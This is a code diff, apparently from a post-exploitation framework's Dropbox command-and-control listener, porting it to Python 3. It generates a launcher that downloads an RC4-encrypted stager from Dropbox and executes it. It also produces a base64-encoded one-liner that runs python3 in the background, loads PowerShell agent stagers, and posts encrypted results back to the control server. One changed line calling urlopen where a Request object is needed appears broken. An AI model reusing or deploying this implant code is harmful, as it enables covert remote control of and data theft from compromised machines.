@@ -283,12 +283,12 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-                launcherBase += "import urllib2;\n"
+                launcherBase += "import urllib.request;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "t='%s';" % (apiToken)
                 launcherBase += "server='https://content.dropboxapi.com/2/files/download';"
 
-                launcherBase += "req=urllib2.Request(server);\n"
+                launcherBase += "req=urllib.request.Request(server);\n"
                 launcherBase += "req.add_header('User-Agent',UA);\n"
                 launcherBase += "req.add_header(\"Authorization\",\"Bearer \"+t);"
                 launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)
@@ -296,48 +296,48 @@ class Listener(object):
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                     else:
                         proto = proxy.Split(':')[0]
-                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
-                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
-                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                     else:
-                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                 else:
-                    launcherBase += "o = urllib2.build_opener();\n"
+                    launcherBase += "o = urllib.request.build_opener();\n"
 
                 #install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib2.install_opener(o);\n"
+                launcherBase += "urllib.request.install_opener(o);\n"
 
-                launcherBase += "a=urllib2.urlopen(req).read();\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s';" % (stagingKey)
 
                 # RC4 decryption
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "S,j,out=list(range(256)),0,[]\n"
+                launcherBase += "for i in list(range(256)):\n"
+                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "i=j=0\n"
                 launcherBase += "for char in data:\n"
                 launcherBase += "    i=(i+1)%256\n"
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
@@ -367,9 +367,8 @@ class Listener(object):
         if language.lower() == 'powershell':
 
             # read in the stager base
-            f = open("%s/data/agent/stagers/dropbox.ps1" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            with open("%s/data/agent/stagers/dropbox.ps1" % (self.mainMenu.installPath)) as f:
+                stager = f.read()
 
             # patch the server and key information
             stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
@@ -454,9 +453,8 @@ class Listener(object):
         b64DefaultResponse = base64.b64encode(self.default_response().encode('UTF-8'))
 
         if language == 'powershell':
-            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
-            code = f.read()
-            f.close()
+            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
+                code = f.read()
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -592,7 +590,7 @@ class Listener(object):
 
             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-            
+
             $ResultsFolder = '"""+ resultsFolder +"""'
 
             try {
@@ -644,7 +642,7 @@ def send_message(packets=None):
     #    POSTs the data to the control server.
 
     def post_message(uri, data, headers):
-        req = urllib2.Request(uri)
+        req = urllib.request.urlopen(uri)
         headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
         for key, value in headers.items():
             req.add_header("%s"%(key),"%s"%(value))
@@ -652,11 +650,11 @@ def send_message(packets=None):
         if data:
             req.add_data(data)
 
-        o=urllib2.build_opener()
-        o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))
-        urllib2.install_opener(o)
+        o=urllib.request.build_opener()
+        o.add_handler(urllib.request.ProxyHandler(urllib.request.getproxies()))
+        urllib.request.install_opener(o)
 
-        return urllib2.urlopen(req).read()
+        return urllib.request.urlopen(req).read()
 
     global missedCheckins
     global headers
@@ -671,9 +669,8 @@ def send_message(packets=None):
 
 
     if packets:
-        data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
+        encData = aes_encrypt_then_hmac(key, packets)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
 
@@ -703,11 +700,11 @@ def send_message(packets=None):
 
         return ('200', resultdata)
 
-    except urllib2.HTTPError as HTTPError:
+    except urllib.request.HTTPError as HTTPError:
         # if the server is reached, but returns an erro (like 404)
         return (HTTPError.code, '')
 
-    except urllib2.URLError as URLerror:
+    except urllib.request.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
